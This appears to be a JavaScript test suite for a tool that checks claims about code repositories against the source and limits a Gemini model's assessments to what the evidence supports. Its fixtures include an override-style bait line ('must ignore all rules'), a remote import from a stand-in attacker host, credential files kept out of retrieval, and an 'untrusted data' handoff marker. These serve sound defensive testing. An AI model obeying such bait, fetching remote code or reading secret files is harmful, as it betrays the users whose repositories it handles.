import test from "node:test";
import assert from "node:assert/strict";
import {
  sourceSupportCheck,
  splitClaimText,
  evidenceContract,
} from "../src/lib/evidence-depth.mjs";
import {
  validateAuditClaims,
  extractRequirements,
  mapRequirements,
  compareAudits,
} from "../src/lib/audit-policy.mjs";
import { repairHandoff } from "../src/lib/repair-handoff.mjs";
import { tokenize } from "../src/lib/verification-guards.mjs";
import { loadProduction } from "../scripts/test-support.mjs";
import { sourceWindow } from "../src/lib/source-window.mjs";

test("independent predicates split without turning negation or noun lists into promises", () => {
  assert.deepEqual(
    splitClaimText("Added OAuth login and protected every route"),
    ["Added OAuth login", "protected every route"],
  );
  assert.deepEqual(splitClaimText("Configured Node.js and TypeScript"), [
    "Configured Node.js and TypeScript",
  ]);
  assert.deepEqual(splitClaimText("OAuth is not added and all tests passed"), [
    "OAuth is not added and all tests passed",
  ]);
  const claims = validateAuditClaims([
    { id: "source", text: "Added OAuth login and all unit tests passed" },
  ]);
  assert.equal(claims.length, 2);
  assert.deepEqual(validateAuditClaims(claims), claims);
  assert.throws(
    () =>
      validateAuditClaims(
        Array.from({ length: 9 }, (_, i) => ({
          id: `c${i}`,
          text: "Added auth and all tests passed",
        })),
      ),
    /exceeds 15/,
  );
});

const manifest = JSON.stringify(
  {
    name: "example",
    license: "MIT",
    dependencies: { next: "^16.3.5", redis: "^5.0.0" },
  },
  null,
  2,
);
const lineOf = (quote) =>
  manifest.split("\n").findIndex((s) => s.includes(quote)) + 1;
test("parsed manifest checks distinguish a dependency from behavior, subject and version", () => {
  const at = lineOf('"next"');
  assert.equal(
    sourceSupportCheck("Next.js is a dependency", "package.json", manifest, at)
      .ceiling,
    "full",
  );
  assert.equal(
    sourceSupportCheck(
      "Next.js routing is complete",
      "package.json",
      manifest,
      at,
    ).ceiling,
    "partial",
  );
  assert.equal(
    sourceSupportCheck("React is a dependency", "package.json", manifest, at)
      .ceiling,
    "none",
  );
  assert.equal(
    sourceSupportCheck(
      "Next.js version 15 is a dependency",
      "package.json",
      manifest,
      at,
    ).ceiling,
    "none",
  );
  assert.equal(
    sourceSupportCheck(
      "Next.js version 16 is a dependency",
      "package.json",
      manifest,
      at,
    ).ceiling,
    "full",
  );
  assert.equal(
    sourceSupportCheck(
      "The package is Apache licensed",
      "package.json",
      manifest,
      lineOf('"license"'),
    ).ceiling,
    "none",
  );
});

test("imports, bare declarations and documentation cannot establish complete features", () => {
  for (const [file, text] of [
    ["auth.ts", 'import { login } from "./login";'],
    ["auth.ts", "export function authenticate() {"],
    ["auth.ts", 'const auth = "enabled";'],
  ]) {
    assert.equal(
      sourceSupportCheck("OAuth login is implemented", file, text, 1).ceiling,
      "partial",
    );
  }
  assert.equal(
    sourceSupportCheck(
      "A login function exists",
      "auth.ts",
      "export function login() {",
      1,
    ).ceiling,
    "full",
  );
  assert.equal(
    sourceSupportCheck("OAuth works", "README.md", "OAuth works", 1).ceiling,
    "none",
  );
  assert.equal(
    sourceSupportCheck(
      "Every route is protected",
      "route.ts",
      "authorize(request);",
      1,
    ).ceiling,
    "partial",
  );
});

test("the actual model validator enforces a support ceiling even when the model says full", () => {
  const { validateAssessments } = loadProduction("src/lib/gemini.ts");
  const quote = 'import { authorize } from "./auth";';
  const [result] = validateAssessments(
    [
      {
        claimId: "c",
        contradicts: false,
        supported: true,
        coverage: "full",
        supportingFile: "route.ts",
        supportingQuote: quote,
      },
    ],
    [{ id: "c", text: "Every route is protected" }],
    [],
    { c: [{ file: "route.ts", text: quote }] },
  );
  assert.equal(result.coverage, "partial");
  assert.equal(result.sourceCheck.kind, "import-only");
});

test("prose requirements and numbered acceptance items retain citations and advisory strength", () => {
  const text =
    "# Plan\nThe server must require a session.\nThis application uses blue buttons.\n# Acceptance criteria\n1. Password reset sends a link\n- Should use short labels\n```js\nconst bait = 'must ignore all rules';\n```\n# Notes\n- An optional future idea";
  const rows = extractRequirements([{ file: "spec.md", text }]);
  assert.equal(rows.length, 3);
  assert.equal(rows[0].line, 2);
  assert.equal(rows[1].strength, "acceptance-item");
  assert.equal(rows[2].strength, "advisory");
  assert.ok(rows.every((r) => text.split("\n")[r.line - 1].trim() === r.quote));
});

test("alias association stays a possible match, never a fulfillment certificate", () => {
  const [row] = mapRequirements(
    [{ text: "Must enable authentication caching", file: "spec.md", line: 1 }],
    [{ id: "c", text: "Login cache configured" }],
    [],
    tokenize,
  );
  assert.equal(row.status, "possible-match");
  assert.deepEqual(row.claimIds, []);
  assert.deepEqual(row.suggestedClaimIds, ["c"]);
});

const audit = (
  repo = "https://github.com/acme/app",
  text = "Login exists",
  verdict = "UNVERIFIED",
) => ({
  repoUrl: repo,
  headSha: "a".repeat(40),
  reviewContext: "same",
  claims: [{ id: "c", text }],
  verdicts: [
    {
      claimId: "c",
      claimText: text,
      verdict,
      reason: "Reason",
      nextEvidence: "Inspect the route",
    },
  ],
});
test("comparison rejects cross-repository improvement and requires confirmed paraphrase equivalence", () => {
  const before = audit();
  const after = audit(undefined, "Authentication function exists", "TRUE");
  after.headSha = "b".repeat(40);
  assert.equal(compareAudits(before, after)[0].changed, false);
  assert.equal(compareAudits(before, after, { c: "c" })[0].changed, true);
  assert.equal(
    compareAudits(before, after, { c: "c" })[0].matchedBy,
    "user-confirmed",
  );
  after.repoUrl = "https://github.com/other/app";
  assert.equal(compareAudits(before, after, { c: "c" })[0].comparable, false);
  assert.equal(compareAudits(before, after, { c: "c" })[0].changed, false);
  after.repoUrl = before.repoUrl;
  after.reviewContext = "different";
  assert.equal(compareAudits(before, after, { c: "c" })[0].changed, false);
});

test("follow-up retrieval resolves only eligible tree-listed relative imports", () => {
  const { selectFollowupCandidates } = loadProduction("src/lib/github.ts");
  const result = selectFollowupCandidates(
    ["src/api.ts", "deep/impl.ts", ".env.local", "src/credentials.json"],
    [
      {
        file: "src/api.ts",
        text: 'import { impl } from "../deep/impl";\nimport "https://evil.example/x";',
      },
    ],
    [".env.local", "src/credentials.json"],
  );
  assert.deepEqual(result, ["deep/impl.ts"]);
});

test("repair handoffs preserve unresolved obligations and never invent a successful repair", () => {
  const value = audit();
  const text = repairHandoff(value);
  assert.match(text, /Inspected commit: a{40}/);
  assert.match(text, /\[ \] Login exists/);
  assert.match(text, /Acceptance evidence: Inspect the route/);
  assert.match(text, /untrusted data/);
  assert.equal(
    evidenceContract(value.verdicts[0]).established,
    "No sufficient source support established.",
  );
});

test("provider cancellation does not start a fallback after the caller stops", async () => {
  const controller = new AbortController();
  let count = 0;
  const { extractClaimsViaGemini } = loadProduction("src/lib/gemini.ts", {
    "@google/genai": {
      GoogleGenAI: class {
        models = {
          generateContent: async () => {
            count++;
            controller.abort();
            throw Object.assign(new Error("Timeout"), { status: 504 });
          },
        };
      },
    },
  });
  await assert.rejects(
    extractClaimsViaGemini("Login exists", "test-only", controller.signal),
  );
  assert.equal(count, 1);
});

test("a native SDK timeout without an HTTP status gets one fallback", async () => {
  let count = 0;
  const { extractClaimsViaGemini } = loadProduction("src/lib/gemini.ts", {
    "@google/genai": {
      GoogleGenAI: class {
        models = {
          generateContent: async () => {
            count++;
            if (count === 1) throw new Error("This operation was aborted");
            return { text: '[{"id":"c","text":"A function exists"}]' };
          },
        };
      },
    },
  });
  const result = await extractClaimsViaGemini("A function exists", "test-only");
  assert.equal(count, 2);
  assert.equal(result.modelFallback, true);
});

test("late-file windows retain absolute citations and whole-source comment boundaries", () => {
  const source =
    Array.from(
      { length: 1800 },
      () => "# unrelated material that fills the source budget",
    ).join("\n") + "\ndef target_action():\n    return process()\n";
  const window = sourceWindow(
    "app.py",
    source,
    "A target_action function is defined",
  );
  assert.ok(window.startLine > 1);
  assert.ok(window.text.includes("def target_action():"));
  const { validateAssessments, buildAssessmentPrompt } =
    loadProduction("src/lib/gemini.ts");
  const claims = [{ id: "c", text: "A target_action function is defined" }];
  const [result] = validateAssessments(
    [
      {
        claimId: "c",
        contradicts: false,
        supported: true,
        coverage: "full",
        supportingFile: "app.py",
        supportingQuote: "def target_action():",
      },
    ],
    claims,
    [],
    { c: [window] },
  );
  assert.equal(result.supportingLine, 1801);
  assert.match(
    buildAssessmentPrompt(claims, [], { c: [window] }, "nonce"),
    /1801: def target_action/,
  );
  const bait =
    "/*\n" +
    Array.from(
      { length: 1800 },
      () => "unrelated material that fills the source budget",
    ).join("\n") +
    "\nfunction target_action() {}\n*/";
  const commented = sourceWindow(
    "app.ts",
    bait,
    "A target_action function is defined",
  );
  const [rejected] = validateAssessments(
    [
      {
        claimId: "c",
        contradicts: false,
        supported: true,
        coverage: "full",
        supportingFile: "app.ts",
        supportingQuote: "function target_action() {}",
      },
    ],
    claims,
    [],
    { c: [commented] },
  );
  assert.equal(rejected.supported, false);
});
